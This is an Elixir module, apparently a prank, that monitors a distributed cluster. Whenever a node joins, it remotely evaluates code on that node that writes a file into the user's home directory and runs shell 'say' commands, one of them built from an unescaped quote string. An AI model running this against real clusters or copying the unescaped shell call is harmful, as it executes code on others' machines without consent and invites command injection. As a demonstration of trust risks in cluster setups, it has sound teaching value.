defmodule Worfbot.NodeMonitor do
  require Logger

  def start_link do
    {:ok, spawn_link fn ->
        :global_group.monitor_nodes true
        monitor
    end}
  end

  def monitor do
    receive do
      {:nodeup, node}   ->
        Logger.info "NodeMonitor: #{node} joined"
        code_string = '''
        require Logger
        home = System.user_home
        filename = home <> "/you_shouldnt_be_so_trusting"
        node = Node.self |> to_string
        contents = "seriously, I could have done bad things"
        file = File.write(filename, contents)
        Logger.debug("[" <> node <> "] wrote " <> filename)
        :os.cmd('say wow `whoami` you should not be so trusting')
        quote = :Worf_quotes |> :global.whereis_name |> GenServer.call :next_quote
        next_cmd = "say '" <> quote <> "'"
        Logger.debug("[" <> node <> "] running `" <> next_cmd <> "`")
        :os.cmd(to_char_list(next_cmd))
        '''
        Node.spawn(node, Code, :eval_string, [code_string])
      {:nodedown, node} -> Logger.info "NodeMonitor: #{node} left"
    end
    monitor
  end
end
